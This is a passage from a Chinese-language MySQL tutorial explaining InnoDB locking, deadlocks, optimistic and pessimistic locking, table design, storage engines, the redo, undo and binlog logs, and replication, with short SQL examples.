UPDATE;</code></p><p>这会对该行加排他锁，同时在表上加一个 意向排他锁（IX）。</p><p>如果别的事务现在想对整张 <code>users</code> 表加排他锁，InnoDB 可以直接看：</p><ul><li>表上是否已经有 IS 或 IX 锁？</li><li>如果有，就知道不能加排他锁，直接冲突</li></ul><p>不用再去一行一行查了。</p><p>所以意向锁是一个“告诉别人我这里有锁”的机制，提高并发时加锁效率。</p><h3 id="共享锁（S-锁）"><a href="#共享锁（S-锁）" class="headerlink" title="共享锁（S 锁）"></a>共享锁（S 锁）</h3><p>允许多个事务同时读取数据，但不能写。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="number">1</span> LOCK <span class="keyword">IN</span> SHARE MODE;</span><br></pre></td></tr></table></figure><h3 id="排他锁（X-锁）"><a href="#排他锁（X-锁）" class="headerlink" title="排他锁（X 锁）"></a>排他锁（X 锁）</h3><p>不允许其他事务读或写。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">FOR</span> <span class="keyword">UPDATE</span>;</span><br></pre></td></tr></table></figure><p>在事务中使用 <code>FOR UPDATE</code> 可以防止其他事务修改数据，常用于悲观锁场景。</p><h3 id="间隙锁"><a href="#间隙锁" class="headerlink" title="间隙锁"></a>间隙锁</h3><p><strong>间隙锁</strong>（<strong>Gap Lock</strong>）是 MySQL 中的一种锁类型，它用于锁定某个范围内的数据行之间的空隙，以防止其他事务在该范围内插入新的数据行。间隙锁通常用于防止 <strong>幻读</strong>（Phantom Read）问题，特别是在 <code>**Repeatable Read**</code> 隔离级别下。</p><p><strong>间隙锁的作用：</strong></p><ul><li><strong>防止幻读</strong>：通过锁定数据行之间的间隙，阻止其他事务在该间隙中插入新的数据行。这样可以确保在同一个事务中多次查询时，查询结果不发生变化，从而避免幻读现象。</li><li><strong>锁定范围</strong>：与普通的行级锁不同，间隙锁不会锁定具体的数据行，而是锁定两个数据行之间的空隙，防止其他事务插入数据到这个空隙中。</li></ul><h2 id="行锁的实现方式"><a href="#行锁的实现方式" class="headerlink" title="行锁的实现方式"></a>行锁的实现方式</h2><p>InnoDB 采用的是<strong>索引上的锁</strong>，不是直接锁整行。如果没用索引，行锁就退化成表锁。</p><p>因此，使用 <code>WHERE</code> 条件时如果没有走索引，锁粒度会变粗，影响性能。</p><hr><h2 id="常见问题与误区"><a href="#常见问题与误区" class="headerlink" title="常见问题与误区"></a>常见问题与误区</h2><h3 id="行锁一定能锁住某一行吗"><a href="#行锁一定能锁住某一行吗" class="headerlink" title="行锁一定能锁住某一行吗"></a>行锁一定能锁住某一行吗</h3><p>不一定。如果条件没用索引，InnoDB 会锁整个表范围。</p><h3 id="为什么加了-FOR-UPDATE-还是被其他事务修改了"><a href="#为什么加了-FOR-UPDATE-还是被其他事务修改了" class="headerlink" title="为什么加了 FOR UPDATE 还是被其他事务修改了"></a>为什么加了 FOR UPDATE 还是被其他事务修改了</h3><p>可能是因为用了非事务引擎，比如 MyISAM，或者语句没有在事务中执行。</p><h1 id="死锁"><a href="#死锁" class="headerlink" title="死锁"></a>死锁</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p><strong>死锁</strong> 是指多个事务在执行过程中，由于资源争用导致事务互相等待对方释放资源，进而形成一种永久等待的状态。这会导致数据库无法继续执行这些事务，造成系统性能下降或停滞。</p><p>死锁的发生通常是因为多个事务对数据库的资源（如行、表）进行并发访问，并且它们之间存在循环等待的关系。</p><h2 id="死锁的四个必要条件"><a href="#死锁的四个必要条件" class="headerlink" title="死锁的四个必要条件"></a>死锁的四个必要条件</h2><p>死锁发生的四个必要条件是：</p><ol><li><strong>互斥条件（Mutual Exclusion）</strong>：至少有一个资源是被一个事务独占的，其他事务不能访问该资源，直到当前事务释放资源。</li><li><strong>占有并等待条件（Hold and Wait）</strong>：一个事务持有至少一个资源，并等待获得其他事务持有的资源。</li><li><strong>不剥夺条件（No Preemption）</strong>：事务持有的资源不能被强制剥夺，必须等事务完成并释放资源后，其他事务才能获取这些资源。</li><li><strong>循环等待条件（Circular Wait）</strong>：多个事务形成一个环状依赖链，每个事务都在等待下一个事务释放它所需要的资源。</li></ol><p>当这四个条件同时满足时，就会发生死锁。</p><h2 id="死锁的例子"><a href="#死锁的例子" class="headerlink" title="死锁的例子"></a>死锁的例子</h2><p>假设有两个事务 A 和 B，它们分别执行以下操作：</p><ul><li><strong>事务 A</strong>：获取资源 R1，等待资源 R2。</li><li><strong>事务 B</strong>：获取资源 R2，等待资源 R1。</li></ul><p>此时：</p><ul><li>事务 A 持有 R1，并等待获取 R2。</li><li>事务 B 持有 R2，并等待获取 R1。</li></ul><p>由于事务 A 和事务 B 互相等待对方释放资源，它们进入了一个死锁状态，无法继续执行。</p><h2 id="死锁检测和解决"><a href="#死锁检测和解决" class="headerlink" title="死锁检测和解决"></a>死锁检测和解决</h2><h3 id="死锁检测"><a href="#死锁检测" class="headerlink" title="死锁检测"></a>死锁检测</h3><p>大多数数据库管理系统（DBMS）可以自动检测死锁。在检测到死锁时，数据库系统会选择回滚其中一个事务以解除死锁。</p><ul><li><strong>死锁检测算法</strong>：数据库系统通常会构建一个<strong>等待图</strong>，如果图中出现环形依赖，说明发生了死锁。</li></ul><h3 id="死锁解决"><a href="#死锁解决" class="headerlink" title="死锁解决"></a>死锁解决</h3><p>当死锁发生时，数据库需要解决死锁问题，通常的做法是回滚其中一个事务。</p><ul><li><strong>回滚事务</strong>：数据库系统会回滚其中一个事务，释放它所占用的资源，从而打破死锁，允许其他事务继续执行。</li><li><strong>超时机制</strong>：在一些系统中，事务如果等待锁的时间过长，可以自动回滚，以避免死锁的发生。</li></ul><h3 id="死锁预防"><a href="#死锁预防" class="headerlink" title="死锁预防"></a>死锁预防</h3><p>通过设计良好的数据库操作流程，可以尽量避免死锁的发生。例如：</p><ul><li><strong>按固定顺序获取锁</strong>：确保所有事务按相同的顺序请求资源，避免形成环状依赖。</li><li><strong>减少锁的粒度</strong>：锁定尽可能小的数据范围，减少死锁的可能性。</li><li><strong>避免长时间持有锁</strong>：事务持有锁的时间越长，死锁的机会就越大。</li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li><strong>死锁</strong> 是多事务并发执行时，由于互相等待而无法继续执行的状态。</li><li>死锁的发生需要满足四个条件：互斥、占有并等待、不剥夺、循环等待。</li><li>解决死锁的方式通常是回滚其中一个事务，释放资源，打破死锁。</li><li><strong>预防死锁</strong> 可以通过合理设计事务的锁获取顺序、减少锁的粒度、避免长时间持有锁等方法来实现。</li></ul><h1 id="乐观锁和悲观锁"><a href="#乐观锁和悲观锁" class="headerlink" title="乐观锁和悲观锁"></a>乐观锁和悲观锁</h1><p>乐观锁和悲观锁不是 MySQL 内置的“锁类型”，它们是一种<strong>并发控制策略</strong>，而不是数据库层直接定义的“锁”。</p><p>可以理解为：<strong>乐观锁和悲观锁，是怎么用这些数据库锁的“思路”或“方式”。</strong></p><hr><h2 id="悲观锁"><a href="#悲观锁" class="headerlink" title="悲观锁"></a>悲观锁</h2><p>悲观锁假设“别人随时可能来改数据”，所以自己在读或写之前，先把数据锁住，防止别人动。</p><h3 id="在-MySQL-里怎么实现悲观锁？"><a href="#在-MySQL-里怎么实现悲观锁？" class="headerlink" title="在 MySQL 里怎么实现悲观锁？"></a>在 MySQL 里怎么实现悲观锁？</h3><p>InnoDB 的 <code>SELECT ... FOR UPDATE</code> 或 <code>LOCK IN SHARE MODE</code> 就是典型的悲观锁实现方式。比如：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">START</span> TRANSACTION;</span><br><span class="line"><span class="keyword">SELECT</span> stock <span class="keyword">FROM</span> products <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">FOR</span> <span class="keyword">UPDATE</span>;</span><br><span class="line"><span class="keyword">UPDATE</span> products <span class="keyword">SET</span> stock <span class="operator">=</span> stock <span class="operator">-</span> <span class="number">1</span> <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line"><span class="keyword">COMMIT</span>;</span><br></pre></td></tr></table></figure><p>在这个过程中，如果其他事务也想对 id&#x3D;1 进行 <code>FOR UPDATE</code>，就会被阻塞，直到当前事务提交或回滚。也就是说，<strong>真的会加锁，真的会阻塞别人。</strong></p><p>这就是 “悲观锁”：怕别人来抢，先锁再说。</p><hr><h2 id="乐观锁"><a href="#乐观锁" class="headerlink" title="乐观锁"></a>乐观锁</h2><p>乐观锁的思路是：我先不锁，我假设别人不会来改，如果真有人改了，那我再处理冲突。</p><h3 id="在-MySQL-里怎么实现乐观锁？"><a href="#在-MySQL-里怎么实现乐观锁？" class="headerlink" title="在 MySQL 里怎么实现乐观锁？"></a>在 MySQL 里怎么实现乐观锁？</h3><p>最常见的方法就是用 <strong>版本号（version 字段）</strong> 或 <strong>时间戳（last_updated）</strong> 控制。</p><p>例子：</p><ol><li>读出一条数据：当前 version 是 3</li><li>处理业务逻辑</li><li>更新时带上版本号：</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> products </span><br><span class="line"><span class="keyword">SET</span> stock <span class="operator">=</span> stock <span class="operator">-</span> <span class="number">1</span>, version <span class="operator">=</span> version <span class="operator">+</span> <span class="number">1</span> </span><br><span class="line"><span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">AND</span> version <span class="operator">=</span> <span class="number">3</span>;</span><br></pre></td></tr></table></figure><p>如果返回行数是 1，说明没人改成功了；如果是 0，说明有人改了 version，现在不是 3 了，那这次就失败，需要重试。</p><p>这就是乐观锁：<strong>不阻塞，但靠检测是否被改过来避免冲突。</strong></p><hr><h2 id="那跟-InnoDB-的行锁、表锁、意向锁有什么关系？"><a href="#那跟-InnoDB-的行锁、表锁、意向锁有什么关系？" class="headerlink" title="那跟 InnoDB 的行锁、表锁、意向锁有什么关系？"></a>那跟 InnoDB 的行锁、表锁、意向锁有什么关系？</h2><p>可以这样归纳：</p><table><thead><tr><th>名称</th><th>属于数据库机制</th><th>是否真的加锁</th><th>是否阻塞</th><th>常见语法</th></tr></thead><tbody><tr><td>行锁</td><td>✅ 是</td><td>✅ 是</td><td>✅ 是</td><td>FOR UPDATE 等</td></tr><tr><td>表锁</td><td>✅ 是</td><td>✅ 是</td><td>✅ 是</td><td>LOCK TABLE</td></tr><tr><td>意向锁</td><td>✅ 是</td><td>✅ 是</td><td>✅ 是</td><td>自动管理，不手动写</td></tr><tr><td><strong>悲观锁</strong></td><td>❌ 是策略</td><td>✅ 借助锁</td><td>✅ 是</td><td>FOR UPDATE</td></tr><tr><td><strong>乐观锁</strong></td><td>❌ 是策略</td><td>❌ 不加锁</td><td>❌ 不阻塞</td><td>WHERE version&#x3D;x</td></tr></tbody></table><p>所以：</p><ul><li>行锁、表锁这些是底层原生机制</li><li>乐观锁、悲观锁是业务设计思路，靠具体写法实现</li></ul><hr><h2 id="哪种更适合大并发"><a href="#哪种更适合大并发" class="headerlink" title="哪种更适合大并发"></a>哪种更适合大并发</h2><ul><li>乐观锁：适合 <strong>读多写少</strong> 的业务，比如用户资料修改、库存秒杀（配合重试机制）</li><li>悲观锁：适合 <strong>写冲突多、修改必须原子性强</strong> 的业务，比如银行转账</li></ul><hr><h1 id="表设计规范和性能调优技巧"><a href="#表设计规范和性能调优技巧" class="headerlink" title="表设计规范和性能调优技巧"></a>表设计规范和性能调优技巧</h1><h2 id="字段类型的选择"><a href="#字段类型的选择" class="headerlink" title="字段类型的选择"></a>字段类型的选择</h2><p>字段类型选得好，数据存得快、查得快，还省空间。常见建议如下：</p><ul><li>能用 <code>TINYINT</code>、<code>SMALLINT</code> 就别直接用 <code>INT</code>、<code>BIGINT</code></li><li>字段长度不要随便给个超大值，比如 <code>VARCHAR(255)</code> 不等于安全</li><li>精确度要求不高的金额，用整数存，比如“以分为单位”</li><li>时间字段优先使用 <code>DATETIME</code>，避免 <code>TIMESTAMP</code> 的时区问题</li><li>不用 <code>ENUM</code>，扩展性差，换成 <code>TINYINT</code> + 映射表可维护性更好</li></ul><h2 id="TEXT-和-VARCHAR-有啥区别"><a href="#TEXT-和-VARCHAR-有啥区别" class="headerlink" title="TEXT 和 VARCHAR 有啥区别"></a>TEXT 和 VARCHAR 有啥区别</h2><ul><li><code>VARCHAR</code> 是变长字符串，最多 65535 字节（和行大小有关）</li><li><code>TEXT</code> 是独立存储的，不适合频繁查询或排序</li><li><code>TEXT</code> 字段不能加普通索引（要用前缀索引或全文索引）</li></ul><p>建议普通文本就用 <code>VARCHAR</code>，超过几千字符才考虑 <code>TEXT</code></p><hr><h2 id="范式"><a href="#范式" class="headerlink" title="范式"></a>范式</h2><p>范式的目标是<strong>去重、避免冗余</strong>。常用的是三范式：</p><ol><li>第一范式（1NF）：字段不可再分</li><li>第二范式（2NF）：每列完全依赖主键（不依赖部分）</li><li>第三范式（3NF）：不依赖于其他非主属性</li></ol><p>简单说，设计上尽量拆表，避免“一个表塞所有东西”的情况。</p><hr><h2 id="范式为什么在项目里经常不管用"><a href="#范式为什么在项目里经常不管用" class="headerlink" title="范式为什么在项目里经常不管用"></a>范式为什么在项目里经常不管用</h2><p>范式理论虽然漂亮，但在真实项目中，有时候为了<strong>查询效率</strong>，会选择<strong>反范式设计</strong>：</p><ul><li>把本来该拆成两张表的数据合成一张（避免 JOIN）</li><li>保留一些重复字段，换取查询速度</li></ul><p>比如电商订单表，可能会冗余存一下用户昵称、商品快照信息，就是典型的反范式实践。</p><hr><h2 id="拆表怎么搞，什么时候该拆"><a href="#拆表怎么搞，什么时候该拆" class="headerlink" title="拆表怎么搞，什么时候该拆"></a>拆表怎么搞，什么时候该拆</h2><p>表数据一多，几百万几千万的时候，一些常规操作就开始卡顿，这时候就该考虑拆表。</p><h3 id="垂直拆表"><a href="#垂直拆表" class="headerlink" title="垂直拆表"></a>垂直拆表</h3><p>按功能或字段类别拆，比如：</p><ul><li>经常查询的字段放一张表（热点字段）</li><li>不常用的大字段（比如用户简介、头像）单独放表</li></ul><h3 id="水平拆表"><a href="#水平拆表" class="headerlink" title="水平拆表"></a>水平拆表</h3><p>按数据量来拆，比如：</p><ul><li>用户表超过千万记录，可以按用户 ID 哈希分成 128 张表</li><li>或者按时间分表：<code>orders_2024_q1</code>、<code>orders_2024_q2</code> 这种</li></ul><p>可以用中间层封装拆分逻辑，比如引入 MyCAT、ShardingSphere 等分库分表中间件。</p><hr><h2 id="大表优化技巧"><a href="#大表优化技巧" class="headerlink" title="大表优化技巧"></a>大表优化技巧</h2><h3 id="限制宽表设计"><a href="#限制宽表设计" class="headerlink" title="限制宽表设计"></a>限制宽表设计</h3><ul><li>字段太多会影响查询效率、缓存命中率</li><li>大字段放外表，非热字段也可以拆</li></ul><h3 id="控制单表数据量"><a href="#控制单表数据量" class="headerlink" title="控制单表数据量"></a>控制单表数据量</h3><ul><li>理论上 InnoDB 支持 64TB，但实际磁盘、索引、查询压力都跟不上</li><li>单表 500 万 ~ 1000 万记录开始出现性能问题是很常见的事</li></ul><h3 id="读写分离"><a href="#读写分离" class="headerlink" title="读写分离"></a>读写分离</h3><ul><li>通过主从同步架构，将读操作分发到从库</li><li>减少主库压力，提高并发能力</li></ul><h3 id="合理分区表（不是分表）"><a href="#合理分区表（不是分表）" class="headerlink" title="合理分区表（不是分表）"></a>合理分区表（不是分表）</h3><p>MySQL 还支持 <strong>分区表</strong>，但限制多、运维复杂，适合特定场景（如按月分区查询）。</p><hr><h2 id="常见问题整理-1"><a href="#常见问题整理-1" class="headerlink" title="常见问题整理"></a>常见问题整理</h2><h3 id="一张表字段太多或数据太多，哪个更危险？"><a href="#一张表字段太多或数据太多，哪个更危险？" class="headerlink" title="一张表字段太多或数据太多，哪个更危险？"></a>一张表字段太多或数据太多，哪个更危险？</h3><p>都危险。字段太多会变成宽表，影响缓存、索引命中；数据太多会导致查询变慢、写入卡顿。两者都要控制在合理范围。</p><h3 id="VARCHAR-要不要给得很长，比如-VARCHAR-1000"><a href="#VARCHAR-要不要给得很长，比如-VARCHAR-1000" class="headerlink" title="VARCHAR 要不要给得很长，比如 VARCHAR(1000)"></a>VARCHAR 要不要给得很长，比如 VARCHAR(1000)</h3><p>如果实际数据都很短，字段越长越浪费内存，尤其是用内存临时表的时候。建议根据实际情况定长。</p><h3 id="为什么有时候拆表反而让查询更慢了"><a href="#为什么有时候拆表反而让查询更慢了" class="headerlink" title="为什么有时候拆表反而让查询更慢了"></a>为什么有时候拆表反而让查询更慢了</h3><p>拆表会带来更多 JOIN、代码复杂度变高，如果不是瓶颈，盲目拆表是优化过度。一定要基于数据量、业务特征来判断。</p><hr><h1 id="存储引擎和日志"><a href="#存储引擎和日志" class="headerlink" title="存储引擎和日志"></a>存储引擎和日志</h1><p>MySQL 支持多种存储引擎，理解成“不同的底层实现方式”，每种引擎对数据的读写方式、锁机制、事务支持等都不一样。</p><p>查看当前默认存储引擎：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> VARIABLES <span class="keyword">LIKE</span> <span class="string">&#x27;default_storage_engine&#x27;</span>;</span><br></pre></td></tr></table></figure><p>查看某张表用的存储引擎：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> <span class="keyword">TABLE</span> STATUS <span class="keyword">LIKE</span> <span class="string">&#x27;表名&#x27;</span>;</span><br></pre></td></tr></table></figure><hr><h2 id="InnoDB-和-MyISAM-的主要区别"><a href="#InnoDB-和-MyISAM-的主要区别" class="headerlink" title="InnoDB 和 MyISAM 的主要区别"></a>InnoDB 和 MyISAM 的主要区别</h2><table><thead><tr><th>特性</th><th>InnoDB</th><th>MyISAM</th></tr></thead><tbody><tr><td>事务</td><td>支持</td><td>不支持</td></tr><tr><td>行级锁</td><td>支持</td><td>不支持（表锁）</td></tr><tr><td>外键</td><td>支持</td><td>不支持</td></tr><tr><td>崩溃恢复能力</td><td>强（有日志）</td><td>弱（容易损坏）</td></tr><tr><td>查询性能</td><td>高并发时表现更好</td><td>适合只读或低并发</td></tr><tr><td>主键方式</td><td>聚簇索引</td><td>普通索引</td></tr><tr><td>数据存储</td><td>数据和索引合存</td><td>分开存储</td></tr></tbody></table><p>结论是：<strong>99% 的场景推荐用 InnoDB</strong>，MyISAM 基本上已是历史遗产。</p><hr><h2 id="聚簇索引的概念"><a href="#聚簇索引的概念" class="headerlink" title="聚簇索引的概念"></a>聚簇索引的概念</h2><p>InnoDB 使用 <strong>聚簇索引</strong>（Clustered Index），主键索引就是数据本身，其他辅助索引存的是主键。</p><p>优点：</p><ul><li>主键查询特别快</li><li>范围查询效率也高</li></ul><p>缺点：</p><ul><li>主键太长会导致其他索引体积变大</li><li>更新主键代价高（要移动整行数据）</li></ul><p>因此，设计表时建议使用整型自增主键作为主键，简洁又高效。</p><hr><h2 id="日志系统"><a href="#日志系统" class="headerlink" title="日志系统"></a>日志系统</h2><p>InnoDB 之所以强悍，很大程度上依赖它的日志机制：</p><h3 id="重做日志（Redo-Log）"><a href="#重做日志（Redo-Log）" class="headerlink" title="重做日志（Redo Log）"></a>重做日志（Redo Log）</h3><ul><li>用来实现 <strong>崩溃恢复</strong></li><li>即使 MySQL 宕机，只要事务提交了，数据就能恢复</li></ul><h3 id="回滚日志（Undo-Log）"><a href="#回滚日志（Undo-Log）" class="headerlink" title="回滚日志（Undo Log）"></a>回滚日志（Undo Log）</h3><ul><li>实现 <strong>事务回滚</strong> 和 <strong>MVCC</strong></li><li>查询操作可以看到历史版本，支撑事务的隔离性</li></ul><h3 id="二进制日志（Binlog）"><a href="#二进制日志（Binlog）" class="headerlink" title="二进制日志（Binlog）"></a>二进制日志（Binlog）</h3><ul><li>属于 MySQL 层日志，不依赖存储引擎</li><li>用于主从同步和数据恢复</li></ul><p>这套日志组合，让 InnoDB 实现了 <strong>先写日志再改数据</strong> 的写流程，保证了事务的安全性。</p><hr><h2 id="InnoDB-的参数调优建议（初级）"><a href="#InnoDB-的参数调优建议（初级）" class="headerlink" title="InnoDB 的参数调优建议（初级）"></a>InnoDB 的参数调优建议（初级）</h2><h3 id="调整-Buffer-Pool"><a href="#调整-Buffer-Pool" class="headerlink" title="调整 Buffer Pool"></a>调整 Buffer Pool</h3><p>Buffer Pool 是 InnoDB 用来缓存数据和索引的内存区域，尽量给大一些，提升读写效率。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> VARIABLES <span class="keyword">LIKE</span> <span class="string">&#x27;innodb_buffer_pool_size&#x27;</span>;</span><br></pre></td></tr></table></figure><p>建议设为服务器内存的 60%-70%（如果是专用 MySQL 服务器）。</p><h3 id="调整事务提交模式"><a href="#调整事务提交模式" class="headerlink" title="调整事务提交模式"></a>调整事务提交模式</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">innodb_flush_log_at_trx_commit <span class="operator">=</span> <span class="number">1</span></span><br></pre></td></tr></table></figure><p>这是默认设置，事务每次提交都要落盘，最安全但写入慢。</p><p>可选：</p><ul><li><code>0</code>：每秒写一次日志，不保证完全不丢数据</li><li><code>2</code>：写日志但不立刻刷盘，性能高一些，有小概率丢事务</li></ul><p>根据数据安全级别需求调整。</p><hr><h2 id="常见问题与解释"><a href="#常见问题与解释" class="headerlink" title="常见问题与解释"></a>常见问题与解释</h2><h3 id="为什么主键不能随便用-UUID？"><a href="#为什么主键不能随便用-UUID？" class="headerlink" title="为什么主键不能随便用 UUID？"></a>为什么主键不能随便用 UUID？</h3><ul><li>UUID 比 INT 长得多，插入时不连续，会导致页分裂，写入效率低</li><li>占用索引空间大，影响性能</li><li>更推荐使用自增 ID 或雪花 ID 这类连续主键</li></ul><h3 id="为什么不推荐用-MyISAM？"><a href="#为什么不推荐用-MyISAM？" class="headerlink" title="为什么不推荐用 MyISAM？"></a>为什么不推荐用 MyISAM？</h3><ul><li>没有事务，数据一多就容易出错</li><li>写入时锁整张表，根本不适合高并发</li><li>崩溃后可能数据恢复不了</li></ul><p>除非是一些只读的临时表，基本没必要用 MyISAM。</p><h3 id="InnoDB-表一定需要主键吗？"><a href="#InnoDB-表一定需要主键吗？" class="headerlink" title="InnoDB 表一定需要主键吗？"></a>InnoDB 表一定需要主键吗？</h3><p>InnoDB 表必须有主键。没有显式主键时，它会自动生成一个隐藏的 6 字节主键。但不能主动控制，所以建议明确设置主键。</p><h1 id="日志系统-1"><a href="#日志系统-1" class="headerlink" title="日志系统"></a>日志系统</h1><p>这一部分专注讲解 <strong>MySQL（尤其是 InnoDB）中的日志系统</strong>，这是事务机制、高可用能力、崩溃恢复背后的核心支撑。日志是理解数据库“为什么不会轻易丢数据”的关键。</p><hr><h2 id="MySQL-有哪些类型的日志"><a href="#MySQL-有哪些类型的日志" class="headerlink" title="MySQL 有哪些类型的日志"></a>MySQL 有哪些类型的日志</h2><p>常见的日志类型有这几种，各有分工：</p><ul><li><strong>Redo Log</strong>（重做日志） — InnoDB 独有</li><li><strong>Undo Log</strong>（回滚日志） — InnoDB 独有</li><li><strong>Binlog</strong>（二进制日志） — MySQL 层日志，跟存储引擎无关</li><li><strong>Error Log</strong>（错误日志） — 系统运行中产生的错误或启动信息</li><li><strong>Slow Query Log</strong>（慢查询日志） — 查 SQL 是否“拖后腿”</li><li><strong>General Log</strong>（通用日志） — 记录所有 SQL，默认关闭</li></ul><p>其中最核心、最容易混淆的，是 Redo Log、Undo Log 和 Binlog。</p><hr><h2 id="Redo-Log：保证数据持久化的关键"><a href="#Redo-Log：保证数据持久化的关键" class="headerlink" title="Redo Log：保证数据持久化的关键"></a>Redo Log：保证数据持久化的关键</h2><p>作用：<strong>崩溃恢复</strong></p><p>InnoDB 的写流程不是直接写磁盘，而是先写 Redo Log，再异步刷数据页到磁盘。这就叫 <strong>WAL（Write-Ahead Logging）机制</strong>。</p><p>流程如下：</p><ol><li>修改数据页，写入内存（Buffer Pool）</li><li>同时写一份日志到 Redo Log（先写磁盘）</li><li>事务提交</li><li>后台再慢慢把数据刷回磁盘页（称为刷新脏页）</li></ol><p>即使数据库宕机，只要 Redo Log 写成功，重启后可以重做操作，数据不丢。</p><p><strong>Redo Log 有两个关键点：</strong></p><ul><li><strong>逻辑结构</strong>：是按页（Page）为单位的物理日志</li><li><strong>落盘控制</strong>：由 <code>innodb_flush_log_at_trx_commit</code> 控制</li></ul><p>设置值解释：</p><ul><li><code>1</code>：每次事务提交都写入磁盘（最安全，默认）</li><li><code>2</code>：写到操作系统缓存，不立即刷盘（性能略高）</li><li><code>0</code>：每秒写一次，崩溃时可能丢事务（性能最高）</li></ul><hr><h2 id="Undo-Log：实现事务回滚和-MVCC-的基础"><a href="#Undo-Log：实现事务回滚和-MVCC-的基础" class="headerlink" title="Undo Log：实现事务回滚和 MVCC 的基础"></a>Undo Log：实现事务回滚和 MVCC 的基础</h2><p>作用：</p><ul><li>回滚事务用的“反操作日志”</li><li>实现多版本并发控制（MVCC）</li></ul><p>Undo Log 记录每一次数据修改前的“旧值”，如果事务执行失败或显式回滚，就可以用 Undo Log 把数据恢复回来。</p><p>另外，读取操作也依赖 Undo Log，才能实现“事务看到的是自己那一刻的数据快照”。</p><hr><h2 id="Binlog：主从同步的关键机制"><a href="#Binlog：主从同步的关键机制" class="headerlink" title="Binlog：主从同步的关键机制"></a>Binlog：主从同步的关键机制</h2><p>作用：</p><ul><li>支撑主从复制</li><li>做数据恢复时能用</li><li>不依赖存储引擎（MyISAM、InnoDB 都会写）</li></ul><p>Binlog 记录的是<strong>逻辑操作</strong>，比如“插入了这条数据”，不关心页或物理地址。</p><p>常见格式：</p><ul><li><strong>STATEMENT</strong>：记录原始 SQL，可能出现副作用（比如 <code>NOW()</code> 每次值都不一样）</li><li><strong>ROW</strong>：记录数据行变化，更安全但日志更大</li><li><strong>MIXED</strong>：两者结合，MySQL 默认设置</li></ul><p>查看格式：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> VARIABLES <span class="keyword">LIKE</span> <span class="string">&#x27;binlog_format&#x27;</span>;</span><br></pre></td></tr></table></figure><p>主从同步就是靠 Binlog 实现的，主库写入操作会记录在 Binlog 中，从库会不断读取并重放这些日志。</p><hr><h2 id="Redo-和-Binlog-的协作逻辑"><a href="#Redo-和-Binlog-的协作逻辑" class="headerlink" title="Redo 和 Binlog 的协作逻辑"></a>Redo 和 Binlog 的协作逻辑</h2><p>InnoDB 的事务提交涉及两个系统：</p><ol><li>Redo Log（物理日志）负责恢复</li><li>Binlog（逻辑日志）负责同步</li></ol><p>为保证两边一致性，MySQL 引入了 <strong>两阶段提交机制</strong>：</p><ol><li>写入 Binlog</li><li>写入 Redo Log，并提交事务</li></ol><p>只有两者都写成功，事务才算真正提交。如果中途失败，MySQL 启动后会自动判断是否需要回滚或补交。</p><hr><h1 id="主从复制与高可用架构设计"><a href="#主从复制与高可用架构设计" class="headerlink" title="主从复制与高可用架构设计"></a>主从复制与高可用架构设计</h1><h2 id="什么是主从复制"><a href="#什么是主从复制" class="headerlink" title="什么是主从复制"></a>什么是主从复制</h2><p>主从复制（Replication）指的是：<strong>一个主库负责写，从库负责读</strong>，主库的数据变动通过日志传给从库，从库再“照着抄”。</p><p>这样能达到：</p><ul><li>分担读请求压力</li><li>提升系统可用性（主库挂了还有从库）</li><li>实现备份、归档、读写分离等目的</li></ul><hr><h2 id="主从复制的核心流程"><a href="#主从复制的核心流程" class="headerlink" title="主从复制的核心流程"></a>主从复制的核心流程</h2><p>复制分为三步：</p><ol><li><strong>主库写 Binlog</strong></li><li><strong>从库 IO 线程拉 Binlog</strong></li><li><strong>从库 SQL 线程执行 Binlog 中的操作</strong></li></ol><p>这个过程叫 <strong>异步复制</strong>，意味着主库写完就完事，不等从库是否同步完。</p><p>也有半同步、全同步等模式，但需要额外配置插件或高版本支持。</p><hr><h2 id="复制方式有哪些？"><a href="#复制方式有哪些？" class="headerlink" title="复制方式有哪些？"></a>复制方式有哪些？</h2><p>MySQL 支持三种复制格式，对应 Binlog 的格式：</p><h3 id="1-Statement-based（SBR）"><a href="#1-Statement-based（SBR）" class="headerlink" title="1. Statement-based（SBR）"></a>1. Statement-based（SBR）</h3><ul><li>复制原始 SQL 语句</li><li>简洁，但可能出现不一致（如非确定性函数）</li></ul><h3 id="2-Row-based（RBR）"><a href="#2-Row-based（RBR）" class="headerlink" title="2. Row-based（RBR）"></a>2. Row-based（RBR）</h3><ul><li>复制每行数据变动（如主键 id 从 1 变成 2）</li><li>最精确，也最耗资源</li></ul><h3 id="3-Mixed-based（MBR）"><a href="#3-Mixed-based（MBR）" class="headerlink" title="3. Mixed-based（MBR）"></a>3. Mixed-based（MBR）</h3><ul><li>混合使用，根据情况选择 SBR 或 RBR</li><li>是 MySQL 